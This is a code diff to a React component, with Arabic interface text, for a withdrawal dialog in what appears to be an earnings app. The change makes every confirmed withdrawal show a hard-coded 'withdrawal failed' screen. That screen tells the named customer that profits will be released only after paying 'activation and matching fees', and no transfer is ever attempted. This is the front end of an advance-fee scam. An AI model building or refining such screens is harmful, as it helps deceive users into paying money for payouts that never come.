@@ -212,7 +212,8 @@ function UserHeader({ onAdminClick }: { onAdminClick: () => void }) {
 
 function WithdrawModal({ onClose, maxAmount, iban, fees }: { onClose: () => void; maxAmount: string; iban: string; fees: string }) {
   const [amount, setAmount] = useState("");
-  const [step, setStep] = useState<"form" | "confirm">("form");
+  const [step, setStep] = useState<"form" | "confirm" | "result">("form");
+  const [submitTime, setSubmitTime] = useState("");
 
   const feesNum = parseFloat(fees.replace(/,/g, ""));
   const amountNum = parseFloat(amount.replace(/,/g, "")) || 0;
@@ -300,12 +301,92 @@ function WithdrawModal({ onClose, maxAmount, iban, fees }: { onClose: () => void
               رجوع
             </button>
             <button
-              onClick={onClose}
+              onClick={() => {
+                const now = new Date();
+                const pad = (n: number) => String(n).padStart(2, "0");
+                const h = now.getHours();
+                const period = h >= 12 ? "م" : "ص";
+                const h12 = h % 12 || 12;
+                const timeStr = `${now.getFullYear()}/${now.getMonth() + 1}/${now.getDate()} ${h12}:${pad(now.getMinutes())}:${pad(now.getSeconds())} ${period}`;
+                setSubmitTime(timeStr);
+                setStep("result");
+              }}
               className="flex-1 py-3.5 rounded-2xl text-white font-bold text-[14px] shadow-lg active:opacity-90 transition-opacity"
               style={{ background: "linear-gradient(135deg,#c8005a 0%,#f0196e 60%,#ff4d88 100%)" }}
             >
               تأكيد السحب
             </button>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  /* ── نافذة فشل السحب ── */
+  if (step === "result") {
+    return (
+      <div
+        className="fixed inset-0 z-50 flex items-center justify-center px-5"
+        style={{ background: "rgba(10,15,40,0.6)" }}
+      >
+        <div
+          className="w-full max-w-sm bg-white rounded-3xl overflow-hidden shadow-2xl"
+          style={{ fontFamily: "'Cairo', sans-serif" }}
+          dir="rtl"
+        >
+          <div className="px-6 pt-7 pb-6 flex flex-col gap-5">
+
+            {/* Title */}
+            <div className="text-right">
+              <div className="flex items-center justify-end gap-2 mb-1">
+                <h3 className="text-[18px] font-extrabold text-[#dc2626]">فشل في السحب</h3>
+                <span className="text-[18px]">⚠️</span>
+              </div>
+              <p className="text-[12px] text-[#8892a4] font-medium">لم يتم إتمام عملية السحب</p>
+            </div>
+
+            {/* Failure reason box */}
+            <div
+              className="rounded-2xl p-4 text-right"
+              style={{ background: "#fff0f0", border: "1.5px solid #fecaca" }}
+            >
+              <p className="text-[13px] font-extrabold text-[#1a1f3c] mb-2">سبب الفشل:</p>
+              <p className="text-[13px] font-medium text-[#374151] leading-relaxed">
+                عزيز العميل / {currentUser.name} 🚨 تعذر تحويل أرباح المتبقي عليك مبلغ رسوم تفعيل والمطابقة{" "}
+                <span className="font-extrabold text-[#dc2626]">{fees}</span> ريال بعد السداد يتم التحويل ارباحك بنجاح ✅
+              </p>
+            </div>
+
+            {/* Attempt details */}
+            <div className="text-right">
+              <p className="text-[13px] font-extrabold text-[#1a1f3c] mb-3">تفاصيل المحاولة:</p>
+              <div className="flex flex-col gap-2">
+                <div className="flex items-center justify-between">
+                  <span className="text-[13px] font-bold text-[#374151]">
+                    {amountNum > 0 ? formatNum(amountNum) : maxAmount} ر.س
+                  </span>
+                  <span className="text-[12px] text-[#8892a4] font-medium">المبلغ المطلوب:</span>
+                </div>
+                <div className="flex items-center justify-between">
+                  <span className="text-[13px] font-bold text-[#374151]">{fees} ر.س</span>
+                  <span className="text-[12px] text-[#8892a4] font-medium">الرسوم المطلوبة:</span>
+                </div>
+                <div className="flex items-center justify-between">
+                  <span className="text-[13px] font-bold text-[#374151]" dir="ltr">{submitTime}</span>
+                  <span className="text-[12px] text-[#8892a4] font-medium">الوقت:</span>
+                </div>
+              </div>
+            </div>
+
+            {/* Close button */}
+            <button
+              onClick={onClose}
+              className="w-full py-4 rounded-2xl text-white font-bold text-[15px] mt-1 active:opacity-90 transition-opacity"
+              style={{ background: "#111827" }}
+            >
+              إغلاق
+            </button>
+
           </div>
         </div>
       </div>
